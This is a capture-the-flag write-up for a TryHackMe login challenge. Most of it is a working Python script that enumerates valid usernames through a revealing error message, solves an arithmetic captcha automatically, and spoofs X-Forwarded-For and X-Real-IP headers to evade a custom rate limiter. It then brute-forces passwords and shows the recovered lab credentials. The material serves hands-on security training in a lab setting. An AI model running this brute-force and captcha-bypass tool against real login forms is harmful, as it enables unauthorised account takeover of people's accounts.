# TryHackMe -- intranet login

## summary

SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly.

## ⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution:  
[https://github.com/garthheff/CTF-Hints](https://github.com/garthheff/CTF-Hints/blob/main/Capture.md)


------------------------------------------------------------------------

## behaviour

Initial page: - username - password - no captcha

After failures: - captcha appears - simple math challenge

Example: 349 \* 93 = ?

------------------------------------------------------------------------

## finding

Error message: The user 'test' does not exist

This allows: - username enumeration

Flow: 1. try login 2. if captcha appears → solve it 3. check response
difference

------------------------------------------------------------------------

## approach

### username enumeration

Loop usernames: - if "does not exist" → invalid - else → valid user

### password brute force

Once valid user found: - loop passwords - detect success by absence of
errors

------------------------------------------------------------------------

## useage 

* username.txt and password.txt within same path as the python script
* base_url withing script updated to the target machine ip
* Optional: Set TEST_MODE = True for safe testing, 1 request, was used during script creation. not really needed now it is working.

------------------------------------------------------------------------

## script

``` python
import re
import requests
from pathlib import Path

base_url = "http://10.49.174.105"
login_url = f"{base_url}/login"

DEBUG = True
TEST_MODE = False
TEST_USER = "test"
TEST_PASS = "test"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": login_url,
    "Origin": base_url,
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}

session = requests.Session()


def log(msg):
    if DEBUG:
        print(msg)


def parse_captcha(html):
    m = re.search(r"(\d+)\s*([+\-*/xX])\s*(\d+)\s*=\s*\?", html)
    if not m:
        return None, None

    left = int(m.group(1))
    op = m.group(2)
    right = int(m.group(3))
    expr = f"{left} {op} {right}"

    if op == "+":
        answer = left + right
    elif op == "-":
        answer = left - right
    elif op in ["*", "x", "X"]:
        answer = left * right
    elif op == "/":
        answer = left // right
    else:
        return None, None

    return expr, str(answer)


def response_has_captcha(html):
    if 'name="captcha"' in html:
        return True
    if "Invalid captcha" in html:
        return True
    if "Captcha enabled" in html:
        return True
    return False


def response_user_missing(html, username):
    return f"The user &#39;{username}&#39; does not exist" in html or f"The user '{username}' does not exist" in html


def response_bad_password(html):
    low = html.lower()
    return "invalid password" in low or "incorrect password" in low or "wrong password" in low


def response_success(html):
    low = html.lower()

    bad_markers = [
        "does not exist",
        "invalid password",
        "incorrect password",
        "wrong password",
        "invalid captcha",
        "captcha enabled",
        'name="captcha"',
        "<strong>error:",
    ]

    for marker in bad_markers:
        if marker in low:
            return False

    return True


def submit_once(username, password, captcha=None):
    data = {
        "username": username,
        "password": password,
    }

    if captcha is not None:
        data["captcha"] = captcha

    log("")
    log(f"[POST] user={username} pass={password}")
    if captcha is not None:
        log(f"[POST] captcha sent={captcha}")
    else:
        log("[POST] captcha sent=None")

    r = session.post(login_url, headers=headers, data=data)

    log(f"[POST] status={r.status_code}")
    log(f"[POST] cookies={session.cookies.get_dict()}")
    log("[POST] response snippet:")
    print(r.text[:500])
    print("-" * 60)

    return r


def attempt_login(username, password):
    first = submit_once(username, password)

    if response_success(first.text):
        return "success", first.text

    if response_user_missing(first.text, username):
        return "bad_user", first.text

    if response_bad_password(first.text):
        return "bad_pass", first.text

    if response_has_captcha(first.text):
        expr, answer = parse_captcha(first.text)

        if answer is None:
            log("[CAPTCHA] captcha requested but parse failed from response body")
            get_page = session.get(login_url, headers=headers)
            log(f"[GET] status={get_page.status_code}")
            log(f"[GET] cookies={session.cookies.get_dict()}")
            expr, answer = parse_captcha(get_page.text)

        log(f"[CAPTCHA] expr={expr}")
        log(f"[CAPTCHA] solved={answer}")

        if answer is None:
            return "captcha_parse_fail", first.text

        second = submit_once(username, password, captcha=answer)

        if response_success(second.text):
            return "success", second.text

        if response_user_missing(second.text, username):
            return "bad_user", second.text

        if response_bad_password(second.text):
            return "bad_pass", second.text

        if "invalid captcha" in second.text.lower():
            return "bad_captcha", second.text

        return "unknown", second.text

    return "unknown", first.text


def load_lines(filename):
    path = Path(__file__).with_name(filename)
    return [line.strip() for line in path.read_text().splitlines() if line.strip()]


if TEST_MODE:
    status, body = attempt_login(TEST_USER, TEST_PASS)
    print("")
    print(f"[TEST RESULT] {status}")
    raise SystemExit


valid_user = None

for username in load_lines("username.txt"):
    status, body = attempt_login(username, "test")
    print(f"[USER CHECK] {username} -> {status}")

    if status == "success":
        print(f"[SUCCESS] {username}:test")
        raise SystemExit

    if status in ["bad_pass", "unknown"]:
        valid_user = username
        print(f"[VALID USER] {username}")
        break


if not valid_user:
    print("No valid username found")
    raise SystemExit


for password in load_lines("password.txt"):
    status, body = attempt_login(valid_user, password)
    print(f"[PASS CHECK] {valid_user}:{password} -> {status}")

    if status == "success":
        print(f"[SUCCESS] {valid_user}:{password}")
        break
```

------------------------------------------------------------------------

## Flag
If successful flag will be shown in the last request

```
------------------------------------------------------------
<h2>Flag.txt:</h2>
<h3>xxxxxxxxxxxxxxxxxxxxxxxx</h3>
------------------------------------------------------------
[PASS CHECK] natalie:sk8board -> success
[SUCCESS] natalie:sk8board
```

------------------------------------------------------------------------

## result

Vulnerability: - user enumeration via error message - weak captcha
implementation

Impact: - valid username discovery - password brute force possible
